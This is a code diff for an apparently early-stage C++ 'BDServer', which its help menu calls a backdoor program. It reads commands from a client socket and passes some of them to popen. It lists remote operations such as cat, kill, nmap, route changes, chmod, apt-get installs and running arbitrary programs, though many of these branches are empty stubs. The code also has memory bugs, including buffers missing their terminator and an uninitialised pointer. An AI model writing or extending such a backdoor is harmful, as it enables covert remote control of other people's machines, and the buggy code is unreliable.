@@ -83,17 +83,17 @@ void BDServer :: waitForCommand()
   char buffer[MAX_PATH];
 
   printf("Waiting for command...\n");
-  memcpy(buffer, "-----------------------------------------------\n\0", 50);
-  write(_ClientSocket, buffer, 50);
+  memcpy(buffer, "-----------------------------------------------\n>> \0", 53);
+  write(_ClientSocket, buffer, 53);
   memset(buffer, 0, MAX_PATH);
   amountRead = read(_ClientSocket, buffer, MAX_PATH);
   while(amountRead > 0){
     trimLeft(buffer, strlen(buffer));
     trimRight(buffer, strlen(buffer));
-    if (amountRead == 0){
+    if (amountRead == 1){
       try{
-	        memcpy(buffer, "Empty command\n", 14);
-	        write(_ClientSocket, buffer, 14);
+	memcpy(buffer, "Empty command\n", 14);
+	write(_ClientSocket, buffer, 14);
       }catch(const std::exception& e){
 	//client has disconnected
 	break;
@@ -109,7 +109,11 @@ void BDServer :: waitForCommand()
       parseCommand(buffer);
       printf("Waiting for command...\n");
     }
+    
+    memcpy(buffer, "\n-----------------------------------------------\n>> \0", 55);
+    write(_ClientSocket, buffer, 55);
     memset(buffer, 0, MAX_PATH);
+   
     amountRead = read(_ClientSocket, buffer, MAX_PATH);
   }
 
@@ -125,31 +129,22 @@ void BDServer :: waitForCommand()
 */
 
 void BDServer :: parseCommand(char* command){
-  /* todo
-     pwd
-     cd <dir>
-     - should be handled with system calls instead of popen
-
-     ls
-     cat <file>
-     help
-     off
-
-     optional:
-     who
-     net
-     ps
-     nmap <params>
-     ext
-  */
+  char* cpy;
   char* function;
   char* arguments;
 
   trimLeft(command, strlen(command));
   trimRight(command, strlen(command));
 
+  //strtok modifies the past in string - make a copy.
+  cpy = (char*)malloc(strlen(command));
+  memcpy(cpy, command, strlen(command));
+  
   //extract function - first characters up to space or tab
-  function = strtok(command, " \t");
+  function = strtok(cpy, " \t");
+
+  printf("after strtok1: %s\n", cpy);
+  
   arguments = strtok(NULL, " \t");
 
   //if next strtok read on NULL is NULL then there are no arguments (nothing following function)
@@ -160,17 +155,57 @@ void BDServer :: parseCommand(char* command){
     }else if(strcmp(function, "ls") == 0){
       //ls with no
       printf("ls no arguments\n");
+    }else if(strcmp(function, "ll") == 0){
+      memcpy(cpy, "ls -FGlAihp\0", 12);
+      executeCommand(cpy);
+    }else if(strcmp(function, "pwd") == 0){
+      printWorkingDirectory();
+    }else if(strcmp(function, "who") == 0){
+      
+    }else if(strcmp(function, "net") == 0){
+      
+    }else if(strcmp(function, "ps") == 0){
+      
     }else{
-      printf("other command, no arguments\n");
+      badFunction(command);
     }
   }else{
     if(strcmp(function, "cd") == 0){
       printf("cd with arguments\n");
+    }else if (strcmp(function, "ls") == 0){
+      executeCommand(command);
+    }else if (strcmp(function, "cat") == 0){
+      
+    }else if (strcmp(function, "kill") == 0){
+      
+    }else if (strcmp(function, "nmap") == 0){
+      
+    }else if (strcmp(function, "netstat") == 0){
+      
+    }else if (strcmp(function, "route") == 0){
+      
+    }else if (strcmp(function, "chmod") == 0){
+      
+    }else if (strcmp(function, "apt-get") == 0){
+
     }else{
-      printf("other command with arguments\n");
-    }
+      badFunction(command);
+    }  
   }
 }
+
+void BDServer :: badFunction(char *command)
+{
+  char *placeholder;
+  char *output = (char*)malloc(MAX_PATH * sizeof(char));
+  
+  memcpy(output, command, strlen(command));
+  output += strlen(command);
+  memcpy(output, ": is not a valid command.\n", 26);
+  output = placeholder;
+}
+
+
 
 /*
   executeCommand
@@ -190,28 +225,23 @@ void BDServer :: executeCommand(char* command)
 
   fp = popen(command, "r");
   if(fp != NULL){
-    while(fgets(path, sizeof(path) -1, fp) != NULL){
+    while(fgets(path, sizeof(path), fp) != NULL){
       memcpy(output, path, strlen(path));
       output += strlen(path);
       //write(_ClientSocket, path, MAX_PATH);
-      memset(path, 0, 256);
+      memset(path, 0, MAX_PATH);
     }
   }else{
+    printf("Bad command\n");
     output[0] = '-';
     output[1] = '1';
     output[2] = '\0';
   }
 
   output = placeholder;
-
-  /* TODO make a parse command function to parse the command, tell user if bad command there - not in execute command. */
-  if(strlen(output) == 0){
-    memcpy(output, command, strlen(command));
-    output += strlen(command) - 1;
-    memcpy(output, ": is not a valid command.\n", 26);
-    output = placeholder;
-  }
-
+  
+  fclose(fp);
+  
   write(_ClientSocket, output, MAX_PATH);
 }
 
@@ -219,28 +249,45 @@ void BDServer :: helpMenu(){
   printf("Printing command list and descriptions...\n");
   char buffer[MAX_PATH];
   memcpy(buffer, "Command listings:\n"
-  "-----------------------------------------------\n"
-  "pwd							- print working directory\n"
-  "cd <dir>						- change directory to <dir>\n"
-  "ls							- list the contents of the current working directory\n"
-  "ll 							- (ls -FGlAihp) more detailed ls\n"
-  "cat <file>						- return contents of <file>\n"
-  "who							- list currently logged in users\n"
-  "net							- show current network configuration\n"
-  "ps							- show currently running processes\n"
-  "kill -9 <pid> 						- kill process <pid>\n"
-  "nmap <params>						- run nmap with <params>\n"
-  "netstat -r 						- Display routing table\n"
-  "route flush 						- flush routing tables\n"
-  "route add -net <ipaddr> gw <gateway> 			- Add a route to the table through <ipaddr>, <gateway>\n"
-  "ext <program> <params>					- run <program> with <parameters>\n"
-  "chmod <permissions> <file>				- change <file> accessibility to <permissions>\n"
-  "apt-get install <pkg> 					- Install <pkg>\n\n"
-  "help							- print this list of commands\n"
-  "off							- terminate the backdoor program\n"
-  "-----------------------------------------------\n\n\0", 1046);
+	 "-----------------------------------------------\n"
+	 "pwd							- print working directory\n"
+	 "cd <dir>						- change directory to <dir>\n"
+	 "ls							- list the contents of the current working directory\n"
+	 "ll 							- (ls -FGlAihp) more detailed ls\n"
+	 "cat <file>						- return contents of <file>\n"
+	 "who							- list currently logged in users\n"
+	 "net							- show current network configuration\n"
+	 "ps							- show currently running processes\n"
+	 "kill -9 <pid> 						- kill process <pid>\n"
+	 "nmap <params>						- run nmap with <params>\n"
+	 "netstat -r 						- Display routing table\n"
+	 "route flush 						- flush routing tables\n"
+	 "route add -net <ipaddr> gw <gateway> 			- Add a route to the table through <ipaddr>, <gateway>\n"
+	 "ext <program> <params>					- run <program> with <parameters>\n"
+	 "chmod <permissions> <file>				- change <file> accessibility to <permissions>\n"
+	 "apt-get install <pkg> 					- Install <pkg>\n\n"
+	 "help							- print this list of commands\n"
+	 "off							- terminate the backdoor program\n"
+	 "-----------------------------------------------\n\n\0", 1046);
   write(_ClientSocket, buffer, strlen(buffer)-1);
   memset(buffer, 0, MAX_PATH);
+}
+
+/*
+  printWorkingDirectory
+
+  prints the working directory, else tells user bad
+ */
+void BDServer :: printWorkingDirectory(){
+  char dir[1024];
+  printf("%d\n", sizeof(dir));
+  if (getcwd(dir, sizeof(dir)) != NULL){
+    write(_ClientSocket, dir, strlen(dir));
+  }else{
+    printf("Bad dir\n");
+    memcpy(dir, "Bad directory\n", 14);
+    write(_ClientSocket, dir, 14);
+  }
 }
 
 void BDServer :: changeDirectory(char *directory){
